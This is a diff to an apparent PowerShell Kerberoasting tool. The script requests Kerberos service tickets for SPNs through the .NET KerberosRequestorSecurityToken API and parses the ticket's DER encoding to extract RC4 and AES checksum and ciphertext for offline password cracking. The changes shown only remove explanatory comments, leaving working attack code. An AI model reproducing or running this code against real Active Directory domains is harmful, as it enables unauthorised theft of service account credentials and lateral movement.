@@ -23,8 +23,7 @@ function Request-TgsForSPN {
     param (
         [string]$SPN
     )
-    # Requests TGS ticket for SPN via .NET API
-    # Uses KerberosRequestorSecurityToken to get ticket in ticket cache
+   
     try {
         $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($SPN)
         $identity = $token.GetRequest() # Forces ticket request.
@@ -109,7 +108,7 @@ function Parse-DerTicket {
         if ($Data[$i] -eq 0x04) {
             $len = $Data[$i+1]
             if ($len -gt 10) {
-                # Likely encrypted data
+               
                 $encIndex = $i + 2
                 break
             }
@@ -126,7 +125,7 @@ function Parse-DerTicket {
 
     
     if ($etype -eq 23) {
-        # RC4 - checksum 16 bytes + ciphertext
+        
         if ($encData.Length -lt 16) { return $null }
         $checksumBytes = $encData[0..15]
         $cipherBytes = $encData[16..($encData.Length - 1)]
@@ -140,7 +139,7 @@ function Parse-DerTicket {
         $cipherBytes = $encData[12..($encData.Length - 1)]
         $checksum = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
         $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
-        $salt = "UNKNOWN"  # Salt is usually realm upper, we can extract realm later
+        $salt = "UNKNOWN" 
     }
     else {
         Write-Verbose "Unsupported encryption type $etype"
